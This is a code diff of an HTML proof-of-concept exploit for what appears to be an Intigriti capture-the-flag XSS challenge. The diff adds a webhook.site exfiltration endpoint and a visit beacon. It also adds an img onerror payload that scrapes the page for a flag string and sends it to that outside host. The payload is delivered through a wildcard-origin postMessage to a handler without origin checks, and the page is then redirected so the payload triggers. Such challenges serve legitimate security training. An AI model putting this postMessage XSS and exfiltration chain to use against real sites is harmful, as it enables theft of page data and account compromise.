@@ -2,9 +2,19 @@
 <body>
 <script>
 const BASE = 'https://challenge-0126.intigriti.io';
+const WEBHOOK = 'https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d';
 
-// XSS payload - use svg onload for immediate execution
-const xss = '<svg onload=alert("gigawatz")>';
+// Track admin visit
+fetch(`${WEBHOOK}/?step=admin_visited_poc`);
+
+// XSS payload with alert + flag exfiltration
+const xss = `<img src=x onerror="
+  alert('gigawatz');
+  fetch('${WEBHOOK}/?xss_triggered=true');
+  const html = document.body.innerHTML;
+  const flag = html.match(/INTIGRITI{[^}]+}/);
+  if (flag) fetch('${WEBHOOK}/?flag='+encodeURIComponent(flag[0]));
+">`;
 
 // Create iframe to checkout page
 const iframe = document.createElement('iframe');
@@ -15,18 +25,17 @@ document.body.appendChild(iframe);
 iframe.onload = () => {
   setTimeout(() => {
     // Send malicious postMessage (no origin validation!)
-    // Try both nickname and toAddress fields
     iframe.contentWindow.postMessage({
       type: 'submitTransaction',
       transaction: {
         nickname: xss,
-        toAddress: '0x' + xss,
+        toAddress: '0x1337',
         currency: '1337COIN',
         amount: 1
       }
     }, '*');
 
-    // Navigate to marketwatch to trigger XSS
+    // Navigate to marketwatch where XSS triggers
     setTimeout(() => {
       window.location = `${BASE}/marketwatch.html`;
     }, 2000);
